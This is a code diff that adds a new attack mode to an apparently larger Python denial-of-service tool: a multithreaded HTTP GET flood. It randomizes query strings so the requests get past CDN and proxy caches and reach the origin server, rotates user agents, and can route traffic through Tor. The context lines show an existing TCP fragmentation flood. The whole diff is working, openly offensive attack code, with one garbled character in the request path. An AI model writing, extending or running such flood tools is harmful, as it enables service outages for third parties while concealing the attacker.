@@ -530,3 +530,72 @@ def attack_tcp_fragmentation(target_url, port, duration, stop_event, pause_event
     while time.time() < attack_end_time and not stop_event.is_set():
         time.sleep(1)
     stop_event.set()
+
+
+# --- NEW: "Dynamic Content" / Cache-Busting GET Flood Worker ---
+# This worker sends GET requests with randomized query parameters to defeat
+# caching layers (CDNs, Varnish, etc.), forcing the origin server to
+# process each request individually.
+def http_cache_bust_worker(stop_event, pause_event, target_ip, port, host_header, use_proxy):
+    """Worker thread that sends a continuous stream of cache-busting HTTP GET requests."""
+    s = None
+    while not stop_event.is_set():
+        if pause_event.is_set():
+            time.sleep(1)
+            continue
+        try:
+            if use_proxy:
+                s = socks.socksocket()
+                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            else:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            s.settimeout(20 if use_proxy else 4)
+            s.connect((target_ip, port))
+
+            # --- The Cache-Busting Logic ---
+            # Generate random query parameters to make each URL unique
+            random_string = "".join(random.sample(string.ascii_letters + string.digits, 8))
+            timestamp = int(time.time())
+
+            # Construct the unique path
+            path = f"/?query={random_string}×tamp={timestamp}"
+
+            user_agent = random.choice(USER_AGENTS)
+
+            # Craft the GET request with the unique path
+            request = (
+                f"GET {path} HTTP/1.1\n"
+                f"Host: {host_header}\n"
+                f"User-Agent: {user_agent}\n"
+                f"Cache-Control: no-cache\n"  # Explicitly tell proxies not to cache
+                f"Connection: close\n\n"
+            ).encode()
+
+            s.send(request)
+        except Exception:
+            time.sleep(0.5)
+        finally:
+            if s:
+                s.close()
+
+
+# --- NEW: Cache-Busting GET Flood Controller ---
+def attack_http_cache_bust(target_url, port, duration, stop_event, pause_event, threads=150, use_proxy=False):
+    """Controller for Cache-Busting HTTP GET flood attacks."""
+    ips = resolve_to_ipv4(target_url)
+    if not ips: return
+
+    attack_end_time = time.time() + duration
+    for ip in ips:
+        for _ in range(threads):
+            t = threading.Thread(
+                target=http_cache_bust_worker,
+                args=(stop_event, pause_event, ip, port, target_url, use_proxy)
+            )
+            t.daemon = True
+            t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
